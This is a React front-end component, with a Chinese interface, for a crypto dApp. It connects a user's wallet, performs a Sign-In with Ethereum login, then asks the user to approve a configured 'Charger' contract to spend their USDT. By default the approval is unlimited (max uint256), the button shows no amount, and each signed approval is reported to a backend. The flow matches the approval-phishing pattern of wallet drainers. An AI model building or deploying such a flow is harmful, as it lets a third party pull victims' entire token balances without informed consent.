"use client";

import { useCallback, useState, useEffect, useRef } from "react";
import { useConnect, useAccount, useDisconnect } from "wagmi";
import { SiweMessage } from "siwe";
import { useSignMessage } from "wagmi";
import { parseAbi } from "viem";
import { useWalletClient } from "wagmi";
import { QRCodeSVG } from "qrcode.react";
import type { Connector } from "wagmi";

const BASE_CHAIN_ID = 8453;

const ERC20_ABI = parseAbi([
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
]);

type Step = "disconnected" | "connected" | "siwe" | "approve" | "done";

const PREFERRED_WALLET_KEY = "dapp_wc_preferred_wallet";

function connectorLabel(id: string): string {
  if (id === "walletConnect") return "WalletConnect";
  if (id === "injected") return "浏览器扩展";
  return id;
}

function isMobile(): boolean {
  if (typeof window === "undefined") return false;
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
}

type PreferredWallet = "metamask" | "trust" | "list";

function getPreferredWallet(): PreferredWallet {
  if (typeof window === "undefined") return "metamask";
  const v = localStorage.getItem(PREFERRED_WALLET_KEY);
  if (v === "trust" || v === "list") return v;
  return "metamask";
}

function setPreferredWallet(w: PreferredWallet): void {
  try {
    localStorage.setItem(PREFERRED_WALLET_KEY, w);
  } catch {
    /**/
  }
}

function openWalletDeepLink(uri: string, wallet: PreferredWallet): void {
  const encoded = encodeURIComponent(uri);
  if (wallet === "metamask") {
    window.location.href = `https://metamask.app.link/wc?uri=${encoded}`;
    return;
  }
  if (wallet === "trust") {
    window.location.href = `https://link.trustwallet.com/wc?uri=${encoded}`;
    return;
  }
  // "list" = show QR in UI, don't redirect
}

export interface AuthFlowProps {
  apiUrl?: string;
  chainId?: number;
  /** If true, hide the outer padding and maxWidth (for embed) */
  compact?: boolean;
}

export function AuthFlow({
  apiUrl = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000",
  chainId = BASE_CHAIN_ID,
  compact = false,
}: AuthFlowProps) {
  const { connect, connectors, isPending } = useConnect();
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  const [step, setStep] = useState<Step>("disconnected");
  const [siweLoading, setSiweLoading] = useState(false);
  const [approveLoading, setApproveLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [approveTxHash, setApproveTxHash] = useState<string | null>(null);
  const [wcUri, setWcUri] = useState<string | null>(null);
  const displayUriUnsubRef = useRef<(() => void) | null>(null);

  const fetchWithCreds = useCallback((url: string, opts: RequestInit = {}) => {
    return fetch(url, { ...opts, credentials: "include" });
  }, []);

  const handleSiwe = useCallback(async () => {
    if (!address) return;
    setError(null);
    setSiweLoading(true);
    try {
      const nonceRes = await fetchWithCreds(`${apiUrl}/siwe/nonce`);
      const { nonce } = await nonceRes.json();
      const domain = typeof window !== "undefined" ? new URL(apiUrl).hostname : "localhost";
      const origin = typeof window !== "undefined" ? window.location.origin : "";
      const message = new SiweMessage({
        domain,
        address,
        statement: "Sign in to the dApp.",
        uri: origin,
        version: "1",
        chainId,
        nonce,
      });
      const toSign = message.prepareMessage();
      const signature = await signMessageAsync({ message: toSign });
      const verifyRes = await fetchWithCreds(`${apiUrl}/siwe/verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: toSign, signature }),
      });
      if (!verifyRes.ok) {
        const data = await verifyRes.json().catch(() => ({}));
        throw new Error(data.error ?? "SIWE verify failed");
      }
      setStep("siwe");
    } catch (e) {
      setError(e instanceof Error ? e.message : "SIWE failed");
    } finally {
      setSiweLoading(false);
    }
  }, [address, signMessageAsync, fetchWithCreds, apiUrl, chainId]);

  const handleApprove = useCallback(async () => {
    if (!address || !walletClient) return;
    const usdtAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}` | undefined;
    const chargerAddress = process.env.NEXT_PUBLIC_CHARGER_CONTRACT_ADDRESS as `0x${string}` | undefined;
    const amount = process.env.NEXT_PUBLIC_DEFAULT_APPROVE_AMOUNT ?? "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    if (!usdtAddress || !chargerAddress) {
      setError("USDT or Charger address not configured");
      return;
    }
    setError(null);
    setApproveLoading(true);
    try {
      const hash = await walletClient.writeContract({
        address: usdtAddress,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [chargerAddress, BigInt(amount)],
      });
      setApproveTxHash(hash);
      await fetchWithCreds(`${apiUrl}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "APPROVE", status: "SUCCESS", address, txHash: hash }),
      }).catch(() => {});
      setStep("done");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Approve failed";
      setError(msg);
      await fetchWithCreds(`${apiUrl}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "APPROVE", status: "FAILED", address, errorSummary: msg }),
      }).catch(() => {});
    } finally {
      setApproveLoading(false);
    }
  }, [address, walletClient, fetchWithCreds, apiUrl]);

  const checkSession = useCallback(async () => {
    const res = await fetchWithCreds(`${apiUrl}/siwe/me`);
    const data = await res.json();
    if (data.address && data.siweVerified) setStep("siwe");
  }, [fetchWithCreds, apiUrl]);

  const handleConnectClick = useCallback(
    async (connector: Connector) => {
      if (connector.id !== "walletConnect") {
        connect({ connector });
        return;
      }
      const mobile = isMobile();
      const preferred = getPreferredWallet();
      try {
        const connectorWithProvider = connector as Connector & { getProvider?: () => Promise<{ on?: (event: string, cb: (uri: string) => void) => void }> };
        const prov = connectorWithProvider.getProvider?.();
        if (prov) {
          const p = await prov;
          if (p?.on) {
            const onUri = (uri: string) => {
              setWcUri(uri);
              if (mobile && preferred !== "list") {
                openWalletDeepLink(uri, preferred);
              }
            };
            p.on("display_uri", onUri);
            displayUriUnsubRef.current = () => {
              try {
                p.off?.("display_uri", onUri);
              } catch {
                /**/
              }
            };
          }
        }
      } catch {
        /**/
      }
      connect({ connector });
    },
    [connect]
  );

  useEffect(() => {
    if (isConnected && address) {
      setStep("connected");
      checkSession();
      setWcUri(null);
    } else {
      setStep("disconnected");
    }
  }, [isConnected, address, checkSession]);

  const wrapperStyle: React.CSSProperties = compact
    ? { padding: "1rem" }
    : { padding: "2rem", maxWidth: 480, margin: "0 auto" };

  return (
    <main style={wrapperStyle}>
      {error && (
        <div style={{ padding: "0.75rem", background: "#3f1f1f", borderRadius: 8, marginBottom: "1rem" }}>
          {error}
        </div>
      )}

      {!isConnected && (
        <section style={{ marginBottom: "1.5rem" }}>
          {isMobile()
            ? (() => {
                const wcConnector = connectors.find((c) => c.id === "walletConnect");
                return wcConnector ? (
                  <button
                    onClick={() => handleConnectClick(wcConnector)}
                    disabled={isPending}
                    style={{
                      padding: "0.75rem 1.25rem",
                      background: "#3b82f6",
                      border: "none",
                      borderRadius: 8,
                      color: "#fff",
                      cursor: isPending ? "not-allowed" : "pointer",
                      marginRight: 8,
                      marginBottom: 8,
                    }}
                  >
                    {isPending ? "连接中…" : "连接钱包"}
                  </button>
                ) : (
                  connectors.map((c) => (
                    <button
                      key={c.uid}
                      onClick={() => handleConnectClick(c)}
                      disabled={isPending}
                      style={{
                        padding: "0.75rem 1.25rem",
                        background: "#3b82f6",
                        border: "none",
                        borderRadius: 8,
                        color: "#fff",
                        cursor: isPending ? "not-allowed" : "pointer",
                        marginRight: 8,
                        marginBottom: 8,
                      }}
                    >
                      {isPending ? "连接中…" : connectorLabel(c.id)}
                    </button>
                  ))
                );
              })()
            : connectors.map((c) => (
                <button
                  key={c.uid}
                  onClick={() => handleConnectClick(c)}
                  disabled={isPending}
                  style={{
                    padding: "0.75rem 1.25rem",
                    background: "#3b82f6",
                    border: "none",
                    borderRadius: 8,
                    color: "#fff",
                    cursor: isPending ? "not-allowed" : "pointer",
                    marginRight: 8,
                    marginBottom: 8,
                  }}
                >
                  {isPending ? "连接中…" : connectorLabel(c.id)}
                </button>
              ))}
          {isMobile() && (
            <p style={{ fontSize: "0.875rem", color: "#94a3b8", marginTop: 8 }}>
              手机端将直接打开已选钱包，{" "}
              <button
                type="button"
                onClick={() => setPreferredWallet("list")}
                style={{ background: "none", border: "none", color: "#60a5fa", cursor: "pointer", padding: 0, textDecoration: "underline" }}
              >
                使用其他钱包
              </button>
            </p>
          )}
        </section>
      )}

      {wcUri && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.7)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            padding: 16,
          }}
          onClick={() => setWcUri(null)}
        >
          <div
            style={{
              background: "#1e293b",
              borderRadius: 12,
              padding: 24,
              maxWidth: 320,
              textAlign: "center",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <p style={{ marginBottom: 16, color: "#e2e8f0" }}>用钱包扫描二维码连接</p>
            <div style={{ background: "#fff", padding: 12, borderRadius: 8, display: "inline-block", marginBottom: 16 }}>
              <QRCodeSVG value={wcUri} size={200} level="M" />
            </div>
            <p style={{ fontSize: 12, color: "#94a3b8", marginBottom: 12 }}>或选择钱包打开</p>
            <div style={{ display: "flex", gap: 8, justifyContent: "center", flexWrap: "wrap" }}>
              <button
                type="button"
                onClick={() => {
                  setPreferredWallet("metamask");
                  openWalletDeepLink(wcUri, "metamask");
                }}
                style={{ padding: "8px 16px", background: "#3b82f6", border: "none", borderRadius: 8, color: "#fff", cursor: "pointer" }}
              >
                MetaMask
              </button>
              <button
                type="button"
                onClick={() => {
                  setPreferredWallet("trust");
                  openWalletDeepLink(wcUri, "trust");
                }}
                style={{ padding: "8px 16px", background: "#3375bb", border: "none", borderRadius: 8, color: "#fff", cursor: "pointer" }}
              >
                Trust Wallet
              </button>
            </div>
            <button
              type="button"
              onClick={() => setWcUri(null)}
              style={{ marginTop: 16, padding: "8px 16px", background: "#475569", border: "none", borderRadius: 8, color: "#fff", cursor: "pointer" }}
            >
              关闭
            </button>
          </div>
        </div>
      )}

      {isConnected && step === "connected" && (
        <section style={{ marginBottom: "1.5rem" }}>
          <p style={{ marginBottom: "0.5rem" }}>已连接: {address?.slice(0, 6)}…{address?.slice(-4)}</p>
          <button
            onClick={handleSiwe}
            disabled={siweLoading}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#22c55e",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: siweLoading ? "not-allowed" : "pointer",
              marginRight: 8,
            }}
          >
            {siweLoading ? "签名中…" : "SIWE 登录"}
          </button>
          <button
            onClick={() => disconnect()}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#52525b",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: "pointer",
            }}
          >
            断开
          </button>
        </section>
      )}

      {isConnected && (step === "siwe" || step === "done") && (
        <section style={{ marginBottom: "1.5rem" }}>
          <p style={{ marginBottom: "0.5rem" }}>已登录: {address?.slice(0, 6)}…{address?.slice(-4)}</p>
          {step === "siwe" && (
            <button
              onClick={handleApprove}
              disabled={approveLoading}
              style={{
                padding: "0.75rem 1.25rem",
                background: "#eab308",
                border: "none",
                borderRadius: 8,
                color: "#000",
                cursor: approveLoading ? "not-allowed" : "pointer",
                marginRight: 8,
              }}
            >
              {approveLoading ? "授权中…" : "授权 USDT (Approve)"}
            </button>
          )}
          {step === "done" && approveTxHash && (
            <p style={{ color: "#22c55e" }}>授权成功 tx: {approveTxHash.slice(0, 10)}…</p>
          )}
          <button
            onClick={() => disconnect()}
            style={{
              padding: "0.75rem 1.25rem",
              background: "#52525b",
              border: "none",
              borderRadius: 8,
              color: "#fff",
              cursor: "pointer",
            }}
          >
            断开
          </button>
        </section>
      )}
    </main>
  );
}
